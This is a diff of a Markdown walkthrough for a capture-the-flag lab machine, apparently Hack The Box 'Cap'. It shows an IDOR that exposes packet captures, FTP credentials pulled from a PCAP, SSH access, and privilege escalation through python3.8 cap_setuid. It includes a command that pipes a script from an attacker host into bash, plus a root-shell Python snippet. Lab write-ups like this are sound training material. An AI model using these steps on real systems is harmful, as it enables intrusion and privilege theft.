@@ -28,7 +28,7 @@ Browsing the HTTP server shows a dashboard with network-related functionalities.
 ![Security Snap Shot User 1](https://github.com/user-attachments/assets/bdd14d07-a31e-48ef-a82b-4012c122dab8)
 
 The usrl ends in a 1, there are two options both work. first you can just change the number to 0-2 etc and see what works. in this case changing the number to 0 will allow you to download a PCAP file which has infomration. Another method is to use `FFUF` and identify other account which might be accesed. below is the screen shot for what I used. 
-1[FFuF](https://github.com/user-attachments/assets/4943d366-defe-4745-91b8-12b9adea043a)
+![FFuF](https://github.com/user-attachments/assets/4943d366-defe-4745-91b8-12b9adea043a)
 
 
 ```
@@ -38,29 +38,35 @@ The usrl ends in a 1, there are two options both work. first you can just change
 # Foothold
 
 ## Wireshark
-
+```
 Download the PCAP file for user 0 and run the following command
+![Wireshark PCAP](https://github.com/user-attachments/assets/2ee7f46d-ebd7-44c5-a599-cedbdeed30c6)
 
-
+```
 ## IDOR Exploit
 While creating packet captures, the URL follows the pattern `/data/<id>`. Incrementing the `id` allows access to previous users’ packet captures, revealing a vulnerability known as **Insecure Direct Object Reference (IDOR)**.
 
 Downloading the capture file at `/data/0` and opening it in WireShark reveals FTP traffic containing plaintext credentials:
 - **Username**: `nathan`
 - **Password**: `Buck3tH4TF0RM3!`
+```
+![Wireshark filter](https://github.com/user-attachments/assets/cf2555b2-771d-48b5-8d51-d2e62ce6b836)
 
-![Security Snapshot](../images/4%20Security%20Snap%20shot.jpg)
-![Security Snapshot - User 0](../images/5%20Scurity%20Snap%20Shot%20user%200.jpg)
-
+```
 ## SSH Access
 Use the credentials to log in via SSH:
 ```bash
 ssh nathan@10.10.10.245
 ```
 
-![SSH into Nathan](../images/9%20ssh%20into%20nathan.jpg)
+
+![ssh into nathan](https://github.com/user-attachments/assets/f897c07c-2217-4e2a-9558-95308262a22e)
 
 You now have a foothold on the system.
+
+if you run ls you will see at .txt file with user Flag
+![user flag](https://github.com/user-attachments/assets/5b98e2a8-df1b-4b5f-a96c-0ac05d8fcd48)
+
 ```
 
 #### **03-Privilege Escalation.md**
@@ -76,6 +82,9 @@ Then, download and execute it from the target machine:
 ```bash
 curl http://<YOUR_IP>/linpeas.sh | bash
 ```
+left side is attacking computer and right is victim
+![linpeas](https://github.com/user-attachments/assets/f33dae68-952f-4621-9b43-cc77e5cab4c2)
+
 
 The scan reveals that `/usr/bin/python3.8` has the following capabilities:
 - **cap_setuid**
@@ -84,12 +93,19 @@ The scan reveals that `/usr/bin/python3.8` has the following capabilities:
 ### Exploit Python Capabilities
 The **cap_setuid** capability allows the Python interpreter to switch to UID 0 (root) without the SUID bit set.
 
+![linpeas vuln](https://github.com/user-attachments/assets/a109be53-21f6-4fca-9dac-2e5091131851)
+
+A quick google search of this vuln will reval how to exploit
+
+![Exploit](https://github.com/user-attachments/assets/886247b0-47a5-4014-91ea-e5c2fb968ed4)
+
 To exploit this, run the following Python commands to spawn a root shell:
 ```python
 import os
 os.setuid(0)
 os.system("/bin/bash")
 ```
+![root](https://github.com/user-attachments/assets/83d9291e-f265-47cf-a9c3-7e7345fb917d)
 
 ## User Flag
 After escalating privileges, retrieve the `user.txt` flag:
@@ -97,11 +113,9 @@ After escalating privileges, retrieve the `user.txt` flag:
 cat user.txt
 ```
 
-![User Flag](../images/10%20user%20flag.jpg)
+![root flag](https://github.com/user-attachments/assets/82cdae30-e33a-45dd-b1c9-dce7ee3a4094)
+
 ```
 
 ---
 
-This Markdown content is designed for your GitHub write-up. Make sure the images are placed in a folder named `images` inside the Cap folder in your GitHub repository, and update the image paths accordingly.
-
-Let me know if you need more adjustments!
